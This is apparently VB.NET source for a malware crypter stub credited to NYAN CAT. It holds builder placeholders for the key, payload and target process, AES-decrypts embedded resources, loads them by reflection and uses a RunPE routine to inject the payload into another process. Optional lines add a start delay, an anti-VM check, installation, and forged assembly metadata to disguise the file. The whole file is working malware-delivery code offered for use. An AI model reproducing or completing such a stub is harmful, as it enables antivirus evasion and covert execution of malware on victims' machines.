'******* https://github.com/NYAN-x-CAT
'******* Credit to NYAN CAT

Imports System, Microsoft.VisualBasic
Imports Microsoft.Win32
Imports System.Windows
Imports System.Windows.Forms
Imports System.Reflection
Imports System.Text
Imports System.Security.Cryptography
Imports System.IO.Compression
Imports System.IO
Imports System.Diagnostics
Imports System.Runtime.InteropServices
Imports System.Collections
Imports System.Collections.Generic

'%ASSEMBLY%<Assembly: AssemblyTitle("%Title%")> 
'%ASSEMBLY%<Assembly: AssemblyDescription("%Description%")> 
'%ASSEMBLY%<Assembly: AssemblyCompany("%Company%")> 
'%ASSEMBLY%<Assembly: AssemblyProduct("%Product%")> 
'%ASSEMBLY%<Assembly: AssemblyCopyright("%Copyright%")> 
'%ASSEMBLY%<Assembly: AssemblyTrademark("%Trademark%")> 
'%ASSEMBLY%<Assembly: AssemblyFileVersion("%v1%" & "." & "%v2%" & "." & "%v3%" & "." & "%v4%")> 
'%A@@SSEMBLY%<Assembly: Guid("%Guid%")>

Public Class Main

    Public Shared Sub Main()
        '@DELAY Threading.Thread.Sleep(#DELAY * 1000)

        '@VM _Voker1(_Method(_Type(_Load(AES.Decrypter(_Resource("#VMDLL"))), "Main.Main"), "Main"), Windows.Forms.Application.ExecutablePath)

        '@INS _Voker1(_Method(_Type(_Load(AES.Decrypter(_Resource("#INSDLL"))), "Main.Main"), "Main"), "#PATH")

        _Voker2(_Method(_Type(_Load(AES.Decrypter(_Resource("#RunPE"))), "PE.Main"), "ST"))

    End Sub

    Public Shared Function _Load(ByVal F As Object)
        Return Reflection.Assembly.Load(F)
    End Function

    Public Shared Function _Type(ByVal L As Reflection.Assembly, ByVal One As String)
        Dim x = L.GetType(One)
        Return x
    End Function

    Public Shared Function _Method(ByVal T As System.Type, ByVal One As String)
        If One <> Nothing Then
            Dim x As Reflection.MethodInfo = T.GetMethod(One, Reflection.BindingFlags.Public Or Reflection.BindingFlags.Static)
            Return x
        End If
    End Function

    Public Shared Function _Voker1(ByVal M As Reflection.MethodInfo, One As String)
        If One <> Nothing Then
            Return M.Invoke(Nothing, New Object() {One})
        End If
    End Function

    Public Shared Function _Voker2(ByVal M As Reflection.MethodInfo)
        Try
            M.Invoke(Nothing, New Object() {"#INJECT", Nothing, AES.Decrypter((_Resource("#PayloadDLL"))), True})
            Return True
        Catch
        End Try
    End Function

    Public Shared Function _Resource(ByVal Name As String)
        Dim Asm As Reflection.Assembly = Reflection.Assembly.GetExecutingAssembly()
        Dim Res As New Resources.ResourceManager("#ResName", Asm)
        Return Res.GetObject(Name)
    End Function

End Class

Public Class AES
    Public Shared Function Decrypter(ByVal File As Byte()) As Byte()
        Dim AES As System.Security.Cryptography.RijndaelManaged = New System.Security.Cryptography.RijndaelManaged()
        Dim hash As Byte() = New Byte(31) {}
        Dim temp As Byte() = New Security.Cryptography.MD5CryptoServiceProvider().ComputeHash(System.Text.Encoding.ASCII.GetBytes("#KEY"))
        Array.Copy(temp, 0, hash, 0, 16)
        Array.Copy(temp, 0, hash, 15, 16)
        AES.Key = hash
        AES.Mode = System.Security.Cryptography.CipherMode.ECB
        Dim DESDecrypter As System.Security.Cryptography.ICryptoTransform = AES.CreateDecryptor()
        Return DESDecrypter.TransformFinalBlock(File, 0, File.Length)
    End Function
End Class